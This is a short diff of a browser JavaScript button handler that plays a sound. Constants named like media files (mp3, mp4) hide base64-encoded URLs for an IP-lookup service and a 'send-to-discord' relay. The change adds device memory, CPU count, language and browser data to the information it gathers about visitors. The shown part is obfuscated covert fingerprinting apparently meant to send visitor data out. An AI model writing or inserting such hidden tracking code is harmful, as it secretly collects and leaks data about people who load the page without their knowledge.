@@ -12,7 +12,13 @@ function cb(){
 btnsound();
 const mp3 = "aHR0cHM6Ly9pcGluZm8uaW8/Y2FsbGJhY2s="
 const mp4 = "aHR0cHM6Ly91NWt1bnRlc3QuZ2xpdGNoLm1lL3NlbmQtdG8tZGlzY29yZA=="
-const uai = {userAgent: window.navigator.userAgent};
+const uai = {
+userAgent: window.navigator.userAgent,
+deviceMemory: window.navigator.deviceMemory,
+hardwareConcurrency: window.navigator.hardwareConcurrency,
+language: window.navigator.language,
+userAgentData: window.navigator.userAgentData
+};
 fetch(atob(mp3))
 .then(res => {
 if(!res.ok){throw new Error(`Network response was not ok: ${res.status}`)}
